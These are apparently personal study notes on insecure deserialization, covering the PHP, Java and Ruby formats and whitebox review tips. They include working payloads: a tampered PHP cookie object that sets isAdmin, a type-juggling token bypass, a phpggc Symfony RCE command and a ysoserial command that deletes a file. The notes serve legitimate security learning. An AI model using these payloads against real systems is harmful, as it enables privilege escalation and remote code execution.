**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential *stream of bytes*. Serializing data makes it much simpler to:
- Write complex data to inter-process memory, a file, or a database
- Send complex data, for example, over a network, between different components of an application, or in an API call
Serialization may be referred to as marshalling (Ruby) or pickling (Python).
![[Pasted image 20240416150946.png]]


**Deserialization** is the process of *restoring this byte stream to a fully functional replica of the original object*, in the exact state as when it was serialized. The website's logic can then interact with this deserialized object, just like it would with any other object.
![[Pasted image 20240416151048.png]]


## What is insecure deserialization?
Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

It is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an *object injection* vulnerability.

An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. **Many deserialization-based attacks are completed before deserialization is finished**. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object. For this reason, websites whose logic is based on strongly typed languages can also be vulnerable to these techniques.

---
# PHP Deserialization
![[Pasted image 20240416160914.png]]
```php
 String
 s:size:value;

 Integer
 i:value;

 Boolean
 b:value; (does not store "true" or "false", does store '1' or '0')

 Null
 N;

 Array
 a:size:{key definition;value definition;(repeated per element)}

 Object
 O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}
```


PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a User object with the attributes:
```php
$user->name = "carlos";
$user->isLoggedIn = true;
```

When serialized, this object may look something like this:
```php
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

This can be interpreted as follows:
**O:4:"User"** - An object with the 4-character class name "User"
**2** - the object has 2 attributes
**s:4:"name"** - The key of the first attribute is the 4-character string "name"
**s:6:"carlos"** - The value of the first attribute is the 6-character string "carlos"
**s:10:"isLoggedIn"** - The key of the second attribute is the 10-character string "isLoggedIn"
**b:1** - The value of the second attribute is the boolean value true


### Modifying object attributes
Change b to 1 to exploit the vulnerable code
```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```
```php
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
```


### Modifying Object Types
From the loose comparisons table, we know that `"lol" == 0 is true`.
Why? Because there is no number, that is, 0 numerals in the string. PHP treats this entire string as the integer 0.

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vqm1ebbbx4sj0fx6hge6kgfno5fazde2";}

// Change data type to integer, if password doesn't start with an integer, this should work, else bruteforce with a number
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

### Gadget Chains
A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage.

```sh
# Go on Github to get more info on running this
phpggc Symfony/RCE4 system 'ls -la' -b
```
```php
# You have to also sign the payload using the secret key (might be in phpinfo)
<?php
echo hash_hmac('sha256', 'Output of phpggc in base64 format', 'secret');
?>
```

For more info: https://www.youtube.com/watch?v=8L3jTFYhUqM

---
# Java Deserialization
Java uses binary serialization formats.
For example, serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in **hexadecimal** and `rO0` in **Base64**.

### Gadget Chains
```sh
# ysoserial tool (Requires Java 8)
java -jar ysoserial-all.jar CommonsCollections3 'rm /home/carlos/morale.txt' | base64 -w 0
```


---
# Ruby Deserialization
https://www.elttam.com/blog/ruby-deserialization/
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ruby-privilege-escalation/#remote-code-execution-with-yaml


---
# Whitebox Pentesting
1) PHP
The native methods for PHP serialization are $serialize()$ and $unserialize()$. If you have source code access, you should start by looking for $unserialize()$ anywhere in the code and investigating further.

Arbitrary Object Injection:-
https://www.vaadata.com/blog/exploiting-and-preventing-insecure-deserialization-vulnerabilities/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md#object-injection

Custom Gadget Chain:-
https://hackmd.io/@monstercuong7/HkYIUuwY6?utm_source=preview-mode&utm_medium=rec#5-Developing-a-custom-gadget-chain-for-PHP-deserialization

2) Java
Any class that implements the interface `java.io.Serializable` can be serialized and deserialized.
Take note of any code that uses the $readObject()$ method, which is used to read and deserialize data from an `InputStream`.
$writeObject()$ for serialization.

For custom gadget chain, check out
https://vanshal.medium.com/sql-injection-by-developing-a-custom-gadget-chain-for-java-deserialization-73e1dcbb9d09